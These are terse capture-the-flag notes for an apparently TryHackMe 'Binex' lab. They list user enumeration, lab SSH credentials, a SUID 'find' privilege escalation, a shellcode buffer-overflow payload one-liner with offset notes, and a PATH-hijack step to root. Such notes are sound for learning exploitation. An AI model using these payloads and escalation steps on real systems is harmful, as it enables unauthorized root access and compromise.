# Binex
found with `enum4linux -a <IP>`

S-1-22-1-1000 Unix User\\kel (Local User)  
S-1-22-1-1001 Unix User\\des (Local User)  
S-1-22-1-1002 Unix User\\tryhackme (Local User)  
S-1-22-1-1003 Unix User\\noentry (Local User)  
 

ssh login: tryhackme:thebest

`find / -perm -u=s -type f 2>/dev/null | less -r` for find suid files, simple suid find privesc from gtfobins

`/usr/bin/find . -exec /bin/bash -p \; -quit`  password: destructive\_72656275696c64

`python -c "print('\x90'*108 + '\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05' + 'A'*484 + '\x68\xe2\xff\xff\xff\x7f\x00\x00')"`

64 bit binaries need <offset number> + <8 extra> + <overwritten eip 8 bytes>

for root, a modified code , compiled simply with gcc and $PATH variable set to its dir like `export PATH=/home/kel:$PATH`